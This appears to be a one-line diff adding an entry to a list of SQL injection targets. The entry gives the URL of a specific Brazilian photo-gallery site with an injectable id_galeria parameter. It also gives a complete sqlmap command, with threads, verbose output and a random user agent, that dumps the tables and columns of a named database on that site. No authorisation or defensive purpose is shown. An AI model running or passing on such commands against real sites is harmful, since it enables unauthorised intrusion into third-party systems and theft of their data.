@@ -1,0 +1,1 @@
+https://www.imagemradical.com.br/exibirfotos.php?id_galeria=1078 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.imagemradical.com.br/exibirfotos.php?id_galeria=1078 -D imagemradical_imagemradical --tables --columns
